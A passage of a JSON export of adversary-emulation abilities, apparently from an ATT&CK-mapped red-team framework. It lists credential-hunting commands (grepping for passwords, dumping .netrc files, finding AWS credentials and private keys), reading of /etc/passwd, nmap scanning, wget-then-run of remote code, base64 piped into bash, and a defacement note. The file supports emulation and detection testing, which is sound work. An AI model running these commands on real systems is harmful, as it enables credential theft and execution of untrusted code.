        "access": {},
        "name": "Exfiltration Over Alternative Protocol - SSH",
        "tactic": "exfiltration",
        "plugin": "atomic",
        "ability_id": "5ac7f6ec1898d8d408f9cdc687262cc7",
        "technique_id": "T1048",
        "repeatable": false
    },
    {
        "description": "[LaZagne Source](https://github.com/AlessandroZ/LaZagne)\n",
        "buckets": [
            "credential-access"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Unsecured Credentials: Credentials In Files",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Extract Browser and System credentials with LaZagne",
        "tactic": "credential-access",
        "plugin": "atomic",
        "ability_id": "32b3ff317f207b221b14283a30f48007",
        "technique_id": "T1552.001",
        "repeatable": false
    },
    {
        "description": "Extracting credentials from files\n",
        "buckets": [
            "credential-access"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Unsecured Credentials: Credentials In Files",
        "requirements": [],
        "singleton": false,
        "executors": [
            {
                "uploads": [],
                "additional_info": {},
                "variations": [],
                "payloads": [],
                "command": "grep -ri password /; exit 0",
                "platform": "linux",
                "parsers": [],
                "build_target": null,
                "cleanup": [],
                "language": null,
                "code": null,
                "name": "sh",
                "timeout": 60
            }
        ],
        "delete_payload": true,
        "access": {},
        "name": "Extract passwords with grep",
        "tactic": "credential-access",
        "plugin": "atomic",
        "ability_id": "b0cc317b44660531ede5eafdce1e3cb5",
        "technique_id": "T1552.001",
        "repeatable": false
    },
    {
        "description": "Hunts for files of a certain extension and inserts a message",
        "buckets": [
            "impact"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Data Manipulation: Stored Data Manipulation",
        "requirements": [],
        "singleton": false,
        "executors": [
            {
                "uploads": [],
                "additional_info": {},
                "variations": [],
                "payloads": [
                    "mission.go"
                ],
                "command": "./mission.go -duration 60 -extension .caldera -dir '/'",
                "platform": "linux",
                "parsers": [],
                "build_target": null,
                "cleanup": [],
                "language": null,
                "code": null,
                "name": "sh",
                "timeout": 60
            }
        ],
        "delete_payload": true,
        "access": {},
        "name": "File Hunter Mission",
        "tactic": "impact",
        "plugin": "stockpile",
        "ability_id": "55f9600a-756f-496b-b27f-682052dc429c",
        "technique_id": "T1565.001",
        "repeatable": false
    },
    {
        "description": "Opens a /dev/bpf file (O_RDONLY), sets BPF filter for 'udp' and captures packets for a few seconds.\n",
        "buckets": [
            "multiple"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Network Sniffing",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Filtered Packet Capture macOS using /dev/bpfN with sudo",
        "tactic": "multiple",
        "plugin": "atomic",
        "ability_id": "38609b9decfc9731e611769bb4923f1b",
        "technique_id": "T1040",
        "repeatable": false
    },
    {
        "description": "Find local AWS credentials from file, defaults to using / as the look path.\n",
        "buckets": [
            "credential-access"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Unsecured Credentials: Credentials In Files",
        "requirements": [],
        "singleton": false,
        "executors": [
            {
                "uploads": [],
                "additional_info": {},
                "variations": [],
                "payloads": [],
                "command": "find / -name \"credentials\" -type f -path \"*/.aws/*\" 2>/dev/null",
                "platform": "linux",
                "parsers": [],
                "build_target": null,
                "cleanup": [],
                "language": null,
                "code": null,
                "name": "sh",
                "timeout": 60
            }
        ],
        "delete_payload": true,
        "access": {},
        "name": "Find AWS credentials",
        "tactic": "credential-access",
        "plugin": "atomic",
        "ability_id": "12b56ab7e1f7739b1a60f6d8098a7ce7",
        "technique_id": "T1552.001",
        "repeatable": false
    },
    {
        "description": "Grep for IP addresses in file system per user",
        "buckets": [
            "collection"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Data from Local System",
        "requirements": [
            {
                "relationship_match": [
                    {
                        "source": "host.user.name"
                    }
                ],
                "module": "plugins.stockpile.app.requirements.paw_provenance"
            }
        ],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Find IP addresses",
        "tactic": "collection",
        "plugin": "stockpile",
        "ability_id": "d69e8660-62c9-431e-87eb-8cf6bd4e35cf",
        "technique_id": "T1005",
        "repeatable": false
    },
    {
        "description": "Find System Network Connections",
        "buckets": [
            "discovery"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "System Network Connections Discovery",
        "requirements": [],
        "singleton": false,
        "executors": [
            {
                "uploads": [],
                "additional_info": {},
                "variations": [],
                "payloads": [],
                "command": "netstat -anto",
                "platform": "linux",
                "parsers": [],
                "build_target": null,
                "cleanup": [],
                "language": null,
                "code": null,
                "name": "sh",
                "timeout": 60
            }
        ],
        "delete_payload": true,
        "access": {},
        "name": "Find System Network Connections",
        "tactic": "discovery",
        "plugin": "stockpile",
        "ability_id": "638fb6bb-ba39-4285-93d1-7e4775b033a8",
        "technique_id": "T1049",
        "repeatable": false
    },
    {
        "description": "This test looks for .netrc files (which stores github credentials in clear text )and dumps its contents if found.\n",
        "buckets": [
            "credential-access"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Unsecured Credentials: Credentials In Files",
        "requirements": [],
        "singleton": false,
        "executors": [
            {
                "uploads": [],
                "additional_info": {},
                "variations": [],
                "payloads": [],
                "command": "for file in $(find /home -type f -name .netrc 2> /dev/null);do echo $file ; cat $file ; done",
                "platform": "linux",
                "parsers": [],
                "build_target": null,
                "cleanup": [],
                "language": null,
                "code": null,
                "name": "sh",
                "timeout": 60
            }
        ],
        "delete_payload": true,
        "access": {},
        "name": "Find and Access Github Credentials",
        "tactic": "credential-access",
        "plugin": "atomic",
        "ability_id": "f6a54519202161924924772a013c51b2",
        "technique_id": "T1552.001",
        "repeatable": false
    },
    {
        "description": "Adversaries may attempt to get a listing of non-security related software that is installed on the system. Adversaries may use the information from Software Discovery during automated discovery to shape follow-on behaviors\n",
        "buckets": [
            "discovery"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Software Discovery",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Find and Display Safari Browser Version",
        "tactic": "discovery",
        "plugin": "atomic",
        "ability_id": "099c4e98d840c7fba1724e8015b88a20",
        "technique_id": "T1518",
        "repeatable": false
    },
    {
        "description": "Grep for all emails for the given target company",
        "buckets": [
            "collection"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Data from Local System",
        "requirements": [
            {
                "relationship_match": [
                    {
                        "source": "host.user.name"
                    }
                ],
                "module": "plugins.stockpile.app.requirements.paw_provenance"
            }
        ],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Find company emails",
        "tactic": "collection",
        "plugin": "stockpile",
        "ability_id": "1f7ff232-ebf8-42bf-a3c4-657855794cfe",
        "technique_id": "T1005",
        "repeatable": false
    },
    {
        "description": "Discover all directories containing deletable files by user",
        "buckets": [
            "discovery"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "System Information Discovery",
        "requirements": [
            {
                "relationship_match": [
                    {
                        "source": "host.user.name"
                    }
                ],
                "module": "plugins.stockpile.app.requirements.paw_provenance"
            }
        ],
        "singleton": false,
        "executors": [
            {
                "uploads": [],
                "additional_info": {},
                "variations": [],
                "payloads": [],
                "command": "find / -type d -user #{host.user.name} \\( -perm -g+w -or -perm -o+w \\) 2>/dev/null -exec ls -adl {} \\;",
                "platform": "linux",
                "parsers": [],
                "build_target": null,
                "cleanup": [],
                "language": null,
                "code": null,
                "name": "sh",
                "timeout": 60
            }
        ],
        "delete_payload": true,
        "access": {},
        "name": "Find deletable dirs (per user)",
        "tactic": "discovery",
        "plugin": "stockpile",
        "ability_id": "30732a56-4a23-4307-9544-09caf2ed29d5",
        "technique_id": "T1082",
        "repeatable": false
    },
    {
        "description": "Locate files deemed sensitive",
        "buckets": [
            "collection"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Data from Local System",
        "requirements": [],
        "singleton": false,
        "executors": [
            {
                "uploads": [],
                "additional_info": {},
                "variations": [],
                "payloads": [],
                "command": "find / -name '*.#{file.sensitive.extension}' -type f -not -path '*/\\.*' -size -500k 2>/dev/null | head -5",
                "platform": "linux",
                "parsers": [
                    {
                        "module": "plugins.stockpile.app.parsers.basic",
                        "parserconfigs": [
                            {
                                "edge": "has_extension",
                                "source": "host.file.path",
                                "custom_parser_vals": {},
                                "target": "file.sensitive.extension"
                            }
                        ]
                    }
                ],
                "build_target": null,
                "cleanup": [],
                "language": null,
                "code": null,
                "name": "sh",
                "timeout": 60
            }
        ],
        "delete_payload": true,
        "access": {},
        "name": "Find files",
        "tactic": "collection",
        "plugin": "stockpile",
        "ability_id": "90c2efaa-8205-480d-8bb6-61d90dbaf81b",
        "technique_id": "T1005",
        "repeatable": false
    },
    {
        "description": "Get a list of all local users",
        "buckets": [
            "discovery"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Account Discovery: Local Account",
        "requirements": [],
        "singleton": false,
        "executors": [
            {
                "uploads": [],
                "additional_info": {},
                "variations": [],
                "payloads": [],
                "command": "cut -d: -f1 /etc/passwd | grep -v '_' | grep -v '#'",
                "platform": "linux",
                "parsers": [
                    {
                        "module": "plugins.stockpile.app.parsers.basic",
                        "parserconfigs": [
                            {
                                "edge": "",
                                "source": "host.user.name",
                                "custom_parser_vals": {},
                                "target": ""
                            }
                        ]
                    }
                ],
                "build_target": null,
                "cleanup": [],
                "language": null,
                "code": null,
                "name": "sh",
                "timeout": 60
            }
        ],
        "delete_payload": true,
        "access": {},
        "name": "Find local users",
        "tactic": "discovery",
        "plugin": "stockpile",
        "ability_id": "c1cd6388-3ced-48c7-a511-0434c6ba8f48",
        "technique_id": "T1087.001",
        "repeatable": false
    },
    {
        "description": "Find private keys on the file system",
        "buckets": [
            "credential-access"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Unsecured Credentials: Private Keys",
        "requirements": [],
        "singleton": false,
        "executors": [
            {
                "uploads": [],
                "additional_info": {},
                "variations": [],
                "payloads": [],
                "command": "for i in .key .pgp .gpg .ppk .p12 .pem .pfx .cer .p7b .asc .crt;do find /etc -maxdepth 3 -name \"*${i}\" 2>/dev/null;done;",
                "platform": "linux",
                "parsers": [],
                "build_target": null,
                "cleanup": [],
                "language": null,
                "code": null,
                "name": "sh",
                "timeout": 60
            }
        ],
        "delete_payload": true,
        "access": {},
        "name": "Find private keys",
        "tactic": "credential-access",
        "plugin": "stockpile",
        "ability_id": "de632c2d-a729-4b77-b781-6a6b09c148ba",
        "technique_id": "T1552.004",
        "repeatable": false
    },
    {
        "description": "Get process info for processes running as a user",
        "buckets": [
            "discovery"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Process Discovery",
        "requirements": [
            {
                "relationship_match": [
                    {
                        "source": "host.user.name"
                    }
                ],
                "module": "plugins.stockpile.app.requirements.paw_provenance"
            }
        ],
        "singleton": false,
        "executors": [
            {
                "uploads": [],
                "additional_info": {},
                "variations": [],
                "payloads": [],
                "command": "ps aux | grep #{host.user.name}",
                "platform": "linux",
                "parsers": [],
                "build_target": null,
                "cleanup": [],
                "language": null,
                "code": null,
                "name": "sh",
                "timeout": 60
            }
        ],
        "delete_payload": true,
        "access": {},
        "name": "Find user processes",
        "tactic": "discovery",
        "plugin": "stockpile",
        "ability_id": "3b5db901-2cb8-4df7-8043-c4628a6a5d5a",
        "technique_id": "T1057",
        "repeatable": false
    },
    {
        "description": "Uses nmap to fingerprint services that were network accessible",
        "buckets": [
            "discovery"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Network Service Scanning",
        "requirements": [],
        "singleton": false,
        "executors": [
            {
                "uploads": [],
                "additional_info": {},
                "variations": [],
                "payloads": [],
                "command": "nmap -sV -p #{remote.host.port} #{remote.host.ip}",
                "platform": "linux",
                "parsers": [],
                "build_target": null,
                "cleanup": [],
                "language": null,
                "code": null,
                "name": "sh",
                "timeout": 60
            }
        ],
        "delete_payload": true,
        "access": {},
        "name": "Fingerprint network services",
        "tactic": "discovery",
        "plugin": "stockpile",
        "ability_id": "3a2ce3d5-e9e2-4344-ae23-470432ff8687",
        "technique_id": "T1046",
        "repeatable": false
    },
    {
        "description": "Gatekeeper Bypass via command line\n",
        "buckets": [
            "defense-evasion"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Subvert Trust Controls: Gatekeeper Bypass",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Gatekeeper Bypass",
        "tactic": "defense-evasion",
        "plugin": "atomic",
        "ability_id": "3de595bb54ec62ed3f18531ccee1da3f",
        "technique_id": "T1553.001",
        "repeatable": false
    },
    {
        "description": "Get Chrome Bookmarks",
        "buckets": [
            "discovery"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Browser Bookmark Discovery",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Get Chrome Bookmarks",
        "tactic": "discovery",
        "plugin": "stockpile",
        "ability_id": "b007fc38-9eb7-4320-92b3-9a3ad3e6ec25",
        "technique_id": "T1217",
        "repeatable": false
    },
    {
        "description": "get current system time (ISO 8601)",
        "buckets": [
            "discovery"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "System Time Discovery",
        "requirements": [],
        "singleton": false,
        "executors": [
            {
                "uploads": [],
                "additional_info": {},
                "variations": [],
                "payloads": [],
                "command": "date -u +\"%Y-%m-%dT%H:%M:%SZ\"",
                "platform": "linux",
                "parsers": [
                    {
                        "module": "plugins.stockpile.app.parsers.basic",
                        "parserconfigs": [
                            {
                                "edge": "",
                                "source": "host.current.time",
                                "custom_parser_vals": {},
                                "target": ""
                            }
                        ]
                    }
                ],
                "build_target": null,
                "cleanup": [],
                "language": null,
                "code": null,
                "name": "sh",
                "timeout": 60
            }
        ],
        "delete_payload": true,
        "access": {},
        "name": "Get System Time",
        "tactic": "discovery",
        "plugin": "stockpile",
        "ability_id": "fa6e8607-e0b1-425d-8924-9b894da5a002",
        "technique_id": "T1124",
        "repeatable": false
    },
    {
        "description": "Compile a c file with either gcc or clang on Linux or Macos.\n",
        "buckets": [
            "defense-evasion"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Obfuscated Files or Information: Compile After Delivery",
        "requirements": [],
        "singleton": false,
        "executors": [
            {
                "uploads": [],
                "additional_info": {},
                "variations": [],
                "payloads": [
                    "a932ec_T1027-004-test.go"
                ],
                "command": "if [ -e  a932ec_T1027-004-test.go ]; then : ; else wget https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1027.004/src/T1027-004-test.go -O a932ec_T1027-004-test.go; fi;  ;  go run a932ec_T1027-004-test.go",
                "platform": "linux",
                "parsers": [],
                "build_target": null,
                "cleanup": [],
                "language": null,
                "code": null,
                "name": "sh",
                "timeout": 60
            }
        ],
        "delete_payload": true,
        "access": {},
        "name": "Go compile",
        "tactic": "defense-evasion",
        "plugin": "atomic",
        "ability_id": "4cbe4aebe95c5729526b5d0325c4de0b",
        "technique_id": "T1027.004",
        "repeatable": false
    },
    {
        "description": "Use common shell utilities to decode a hex-encoded text string and echo it to the console\n",
        "buckets": [
            "defense-evasion"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Deobfuscate/Decode Files or Information",
        "requirements": [],
        "singleton": false,
        "executors": [
            {
                "uploads": [],
                "additional_info": {},
                "variations": [],
                "payloads": [],
                "command": "ENCODED=$(echo 'Hello from Atomic Red Team test T1140!' | xxd -ps -c 256); printf $ENCODED | xxd -r -p; echo $ENCODED | xxd -r -p; echo $(echo $ENCODED) | xxd -r -p; echo $ENCODED > /tmp/T1140.encoded && xxd -r -p /tmp/T1140.encoded; echo $ENCODED > /tmp/T1140.encoded && xxd -r -p < /tmp/T1140.encoded; echo $ENCODED > /tmp/T1140.encoded && cat /tmp/T1140.encoded | xxd -r -p; echo $ENCODED > /tmp/T1140.encoded && cat < /tmp/T1140.encoded | xxd -r -p",
                "platform": "linux",
                "parsers": [],
                "build_target": null,
                "cleanup": [],
                "language": null,
                "code": null,
                "name": "sh",
                "timeout": 60
            }
        ],
        "delete_payload": true,
        "access": {},
        "name": "Hex decoding with shell utilities",
        "tactic": "defense-evasion",
        "plugin": "atomic",
        "ability_id": "6004a80b66c4c3e30595f178d91e2051",
        "technique_id": "T1140",
        "repeatable": false
    },
    {
        "description": "Requires Apple Dev Tools\n",
        "buckets": [
            "defense-evasion"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Hide Artifacts: Hidden Files and Directories",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Hidden files",
        "tactic": "defense-evasion",
        "plugin": "atomic",
        "ability_id": "515c4806970b4836b9a3c251515a6147",
        "technique_id": "T1564.001",
        "repeatable": false
    },
    {
        "description": "Hide a directory on MacOS\n",
        "buckets": [
            "defense-evasion"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Hide Artifacts: Hidden Files and Directories",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Hide a Directory",
        "tactic": "defense-evasion",
        "plugin": "atomic",
        "ability_id": "28b6c4b9b4441ece378a8cfd09bb451f",
        "technique_id": "T1564.001",
        "repeatable": false
    },
    {
        "description": "Identify system hostname for Linux and macOS systems.\n",
        "buckets": [
            "discovery"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "System Information Discovery",
        "requirements": [],
        "singleton": false,
        "executors": [
            {
                "uploads": [],
                "additional_info": {},
                "variations": [],
                "payloads": [],
                "command": "hostname",
                "platform": "linux",
                "parsers": [],
                "build_target": null,
                "cleanup": [],
                "language": null,
                "code": null,
                "name": "sh",
                "timeout": 60
            }
        ],
        "delete_payload": true,
        "access": {},
        "name": "Hostname Discovery",
        "tactic": "discovery",
        "plugin": "atomic",
        "ability_id": "4a37cc5d05b6ce7a7287247ecf1aa404",
        "technique_id": "T1082",
        "repeatable": false
    },
    {
        "description": "Find user running agent",
        "buckets": [
            "discovery"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "System Owner/User Discovery",
        "requirements": [],
        "singleton": false,
        "executors": [
            {
                "uploads": [],
                "additional_info": {},
                "variations": [],
                "payloads": [],
                "command": "whoami",
                "platform": "linux",
                "parsers": [
                    {
                        "module": "plugins.stockpile.app.parsers.basic",
                        "parserconfigs": [
                            {
                                "edge": "",
                                "source": "host.user.name",
                                "custom_parser_vals": {},
                                "target": ""
                            },
                            {
                                "edge": "",
                                "source": "domain.user.name",
                                "custom_parser_vals": {},
                                "target": ""
                            }
                        ]
                    }
                ],
                "build_target": null,
                "cleanup": [],
                "language": null,
                "code": null,
                "name": "sh",
                "timeout": 60
            }
        ],
        "delete_payload": true,
        "access": {},
        "name": "Identify active user",
        "tactic": "discovery",
        "plugin": "stockpile",
        "ability_id": "c0da588f-79f0-4263-8998-7496b1a40596",
        "technique_id": "T1033",
        "repeatable": false
    },
    {
        "description": "Identify all local users",
        "buckets": [
            "discovery"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Account Discovery: Local Account",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Identify local users",
        "tactic": "discovery",
        "plugin": "stockpile",
        "ability_id": "feaced8f-f43f-452a-9500-a5219488abb8",
        "technique_id": "T1087.001",
        "repeatable": false
    },
    {
        "description": "Creates a root CA with openssl\n",
        "buckets": [
            "defense-evasion"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Subvert Trust Controls: Install Root Certificate",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Install root CA on macOS",
        "tactic": "defense-evasion",
        "plugin": "atomic",
        "ability_id": "347554800d9fecf541670235a8ec31d9",
        "technique_id": "T1553.004",
        "repeatable": false
    },
    {
        "description": "### Keychain Files\n\n  ~/Library/Keychains/\n\n  /Library/Keychains/\n\n  /Network/Library/Keychains/\n\n  [Security Reference](https://developer.apple.com/legacy/library/documentation/Darwin/Reference/ManPages/man1/security.1.html)\n\n  [Keychain dumper](https://github.com/juuso/keychaindump)\n",
        "buckets": [
            "credential-access"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Credentials from Password Stores: Keychain",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Keychain",
        "tactic": "credential-access",
        "plugin": "atomic",
        "ability_id": "59c02702e85383fa2fe0c95c257166de",
        "technique_id": "T1555.001",
        "repeatable": false
    },
    {
        "description": "Create a plist and execute it\n",
        "buckets": [
            "multiple"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Create or Modify System Process: Launch Agent",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Launch Agent",
        "tactic": "multiple",
        "plugin": "atomic",
        "ability_id": "23246f1b042898be6b168efedcb36fd4",
        "technique_id": "T1543.001",
        "repeatable": false
    },
    {
        "description": "Utilize LaunchDaemon to launch `Hello World`\n",
        "buckets": [
            "multiple"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Create or Modify System Process: Launch Daemon",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Launch Daemon",
        "tactic": "multiple",
        "plugin": "atomic",
        "ability_id": "506074e8dd220bcbee66150349292c00",
        "technique_id": "T1543.004",
        "repeatable": false
    },
    {
        "description": "Utilize launchctl\n",
        "buckets": [
            "execution"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "System Services: Launchctl",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Launchctl",
        "tactic": "execution",
        "plugin": "atomic",
        "ability_id": "58193baa89a80d5bcd0276e89b3f76c6",
        "technique_id": "T1569.001",
        "repeatable": false
    },
    {
        "description": "Create a text file for the user to find",
        "buckets": [
            "impact"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Defacement",
        "requirements": [],
        "singleton": false,
        "executors": [
            {
                "uploads": [],
                "additional_info": {},
                "variations": [],
                "payloads": [],
                "command": "echo \"proof that this machine was hacked.\" > message.txt",
                "platform": "linux",
                "parsers": [],
                "build_target": null,
                "cleanup": [],
                "language": null,
                "code": null,
                "name": "sh",
                "timeout": 60
            }
        ],
        "delete_payload": true,
        "access": {},
        "name": "Leave note",
        "tactic": "impact",
        "plugin": "stockpile",
        "ability_id": "47d08617-5ce1-424a-8cc5-c9c978ce6bf9",
        "technique_id": "T1491",
        "repeatable": false
    },
    {
        "description": "Using Linux Base64 Encoded shell scripts that have Shebang in them. This is commonly how attackers obfuscate passing and executing a shell script. Seen [here](https://www.trendmicro.com/pl_pl/research/20/i/the-evolution-of-malicious-shell-scripts.html) by TrendMicro, as well as [LinPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS). Also a there is a great Sigma rule [here](https://github.com/SigmaHQ/sigma/blob/master/rules/linux/process_creation/proc_creation_lnx_base64_shebang_cli.yml) for it. \n",
        "buckets": [
            "defense-evasion"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Deobfuscate/Decode Files or Information",
        "requirements": [],
        "singleton": false,
        "executors": [
            {
                "uploads": [],
                "additional_info": {},
                "variations": [],
                "payloads": [],
                "command": "echo IyEvYmluL2Jhc2gKZWNobyAiaHR0cHM6Ly93d3cueW91dHViZS5jb20vQGF0b21pY3NvbmFmcmlkYXkgRlRXIgo= | base64 -d | bash; echo IyEvYmluL2Rhc2gKZWNobyAiaHR0cHM6Ly93d3cueW91dHViZS5jb20vQGF0b21pY3NvbmFmcmlkYXkgRlRXIgo= | base64 -d | bash; echo IyEvYmluL2Rhc2gKZWNobyAiaHR0cHM6Ly93d3cueW91dHViZS5jb20vQGF0b21pY3NvbmFmcmlkYXkgRlRXIgo= | base64 -d | bash; echo IyEvYmluL3NoCmVjaG8gImh0dHBzOi8vd3d3LnlvdXR1YmUuY29tL0BhdG9taWNzb25hZnJpZGF5IEZUVyIK | base64 -d | bash",
                "platform": "linux",
                "parsers": [],
                "build_target": null,
                "cleanup": [],
                "language": null,
                "code": null,
                "name": "sh",
                "timeout": 60
            }
        ],
        "delete_payload": true,
        "access": {},
        "name": "Linux Base64 Encoded Shebang in CLI",
        "tactic": "defense-evasion",
        "plugin": "atomic",
        "ability_id": "d38cba2905e62b4c1a7e5c88137ce485",
        "technique_id": "T1140",
        "repeatable": false
    },
    {
        "description": "List contents of current directory",
        "buckets": [
            "discovery"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "File and Directory Discovery",
        "requirements": [],
        "singleton": false,
        "executors": [
            {
                "uploads": [],
                "additional_info": {},
                "variations": [],
                "payloads": [],
                "command": "ls",
                "platform": "linux",
                "parsers": [],
                "build_target": null,
                "cleanup": [],
                "language": null,
                "code": null,
                "name": "sh",
                "timeout": 60
            }
        ],
        "delete_payload": true,
        "access": {},
        "name": "List Directory",
        "tactic": "discovery",
        "plugin": "stockpile",
        "ability_id": "52177cc1-b9ab-4411-ac21-2eadc4b5d3b8",
        "technique_id": "T1083",
        "repeatable": false
    },
    {
        "description": "Searches for Google Chrome's Bookmark file (on macOS) that contains bookmarks in JSON format and lists any found instances to a text file.\n",
        "buckets": [
            "discovery"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Browser Bookmark Discovery",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "List Google Chrome Bookmark JSON Files on macOS",
        "tactic": "discovery",
        "plugin": "atomic",
        "ability_id": "0142dca15d1eaabd3333bae002d1e15a",
        "technique_id": "T1217",
        "repeatable": false
    },
    {
        "description": "Searches for Mozilla Firefox's places.sqlite file (on macOS) that contains bookmarks and lists any found instances to a text file.\n",
        "buckets": [
            "discovery"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Browser Bookmark Discovery",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "List Mozilla Firefox Bookmark Database Files on macOS",
        "tactic": "discovery",
        "plugin": "atomic",
        "ability_id": "7f1915b1e29069b2d91dfabf4177f13c",
        "technique_id": "T1217",
        "repeatable": false
    },
    {
        "description": "Identify System Info\n",
        "buckets": [
            "discovery"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "System Information Discovery",
        "requirements": [],
        "singleton": false,
        "executors": [
            {
                "uploads": [],
                "additional_info": {},
                "variations": [],
                "payloads": [],
                "command": "uname -a >> /tmp/T1082.txt; if [ -f /etc/lsb-release ]; then cat /etc/lsb-release >> /tmp/T1082.txt; fi; if [ -f /etc/redhat-release ]; then cat /etc/redhat-release >> /tmp/T1082.txt; fi   ; if [ -f /etc/issue ]; then cat /etc/issue >> /tmp/T1082.txt; fi; uptime >> /tmp/T1082.txt; cat /tmp/T1082.txt 2>/dev/null",
                "platform": "linux",
                "parsers": [],
                "build_target": null,
                "cleanup": [
                    "rm /tmp/T1082.txt 2>/dev/null"
                ],
                "language": null,
                "code": null,
                "name": "sh",
                "timeout": 60
            }
        ],
        "delete_payload": true,
        "access": {},
        "name": "List OS Information",
        "tactic": "discovery",
        "plugin": "atomic",
        "ability_id": "278b4cdafa0ddc90b98bc2ce8df2c05f",
        "technique_id": "T1082",
        "repeatable": false
    },
    {
        "description": "This test searches for Safari's Bookmarks file (on macOS) and lists any found instances to a text file.\n",
        "buckets": [
            "discovery"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Browser Bookmark Discovery",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "List Safari Bookmarks on MacOS",
        "tactic": "discovery",
        "plugin": "atomic",
        "ability_id": "8afbf7b71eb22ce8a3d64218f6a8128f",
        "technique_id": "T1217",
        "repeatable": false
    },
    {
        "description": "\"This will test if the macOS firewall is enabled and/or show what rules are configured. Must be run with elevated privileges. Upon successful execution, these commands will output various information about the firewall configuration, including status and specific port/protocol blocks or allows. \n\nUsing `defaults`, additional arguments can be added to see filtered details, such as `globalstate` for global configuration (\\\"Is it on or off?\\\"), `firewall` for common application allow rules, and `explicitauths` for specific rules configured by the user. \n\nUsing `socketfilterfw`, flags such as --getglobalstate or --listapps can be used for similar filtering. At least one flag is required to send parseable output to standard out. \n",
        "buckets": [
            "discovery"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "System Network Configuration Discovery",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "List macOS Firewall Rules",
        "tactic": "discovery",
        "plugin": "atomic",
        "ability_id": "97f08c0a2e89b3710d38bf6e4a6b2cbb",
        "technique_id": "T1016",
        "repeatable": false
    },
    {
        "description": "List opened files by user\n",
        "buckets": [
            "discovery"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Account Discovery: Local Account",
        "requirements": [],
        "singleton": false,
        "executors": [
            {
                "uploads": [],
                "additional_info": {},
                "variations": [],
                "payloads": [],
                "command": "username=$(id -u -n) && lsof -u $username",
                "platform": "linux",
                "parsers": [],
                "build_target": null,
                "cleanup": [],
                "language": null,
                "code": null,
                "name": "sh",
                "timeout": 60
            }
        ],
        "delete_payload": true,
        "access": {},
        "name": "List opened files by user",
        "tactic": "discovery",
        "plugin": "atomic",
        "ability_id": "958ef3f865356e682d569ff36cbf88de",
        "technique_id": "T1087.001",
        "repeatable": false
    },
    {
        "description": "Load Metasploit Abilities",
        "buckets": [
            "build-capabilities"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Build or acquire exploits",
        "requirements": [],
        "singleton": false,
        "executors": [
            {
                "uploads": [],
                "additional_info": {},
                "variations": [],
                "payloads": [
                    "msf_extract.rb"
                ],
